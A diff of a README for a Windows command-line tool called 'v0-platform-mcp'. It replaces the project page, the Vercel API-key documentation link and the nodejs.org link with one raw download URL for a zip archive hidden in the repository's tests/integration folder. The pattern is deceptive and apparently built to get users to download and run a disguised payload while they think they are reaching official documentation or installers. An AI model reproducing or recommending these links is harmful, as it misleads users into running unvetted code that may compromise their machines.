@@ -1,6 +1,6 @@
 # ⚙️ v0-platform-mcp - Simplify Multi-Screen Prototyping
 
-[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-blue?style=for-the-badge)](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
+[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This software runs on Windows and works through a simple command-line interface.
 
 ## 🚀 Getting Started
 
-[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-brightgreen?style=for-the-badge)](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
+[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip)
 
 Follow these steps to download and run v0-platform-mcp on your Windows computer.
 
@@ -23,7 +23,7 @@ Follow these steps to download and run v0-platform-mcp on your Windows computer.
 ### 1. Download the software
 
 - Visit the project page to get the latest version:  
-  [https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)  
+  [https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip)  
 - On the page, look for a **Releases** section or links to download the program files.  
 - Download the file designed for Windows. Usually, it will have an `.exe` or `.zip` extension.
 
@@ -42,7 +42,7 @@ Follow these steps to download and run v0-platform-mcp on your Windows computer.
 
 v0-platform-mcp needs an API key from Vercel to work.
 
-- Go to [https://vercel.com/docs/v0/model-api](https://vercel.com/docs/v0/model-api).  
+- Go to [https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip).  
 - Create an account or log in if you already have one.  
 - Follow the steps on the website to create and copy your v0 API key.
 
@@ -136,7 +136,7 @@ Use these commands step-by-step or combine them according to your workflow.
 ## 🔧 Troubleshooting
 
 - If installation fails, check your internet connection and try again.  
-- Confirm Node.js is installed by typing `node -v` in Command Prompt. If you don’t see a version number, install Node.js from [https://nodejs.org/](https://nodejs.org/).  
+- Confirm Node.js is installed by typing `node -v` in Command Prompt. If you don’t see a version number, install Node.js from [https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip).  
 - If you get errors when running commands, double-check that you pasted your API key correctly.  
 - Restart Command Prompt or your PC if the program does not start.
 
@@ -156,4 +156,4 @@ If you run into problems not solved by these instructions:
 
 Download v0-platform-mcp from here and follow the install instructions above:
 
-[https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
+[https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip](https://raw.githubusercontent.com/Enfluranehighbloodpressure470/v0-platform-mcp/main/tests/integration/platform-mcp-v-1.1.zip)
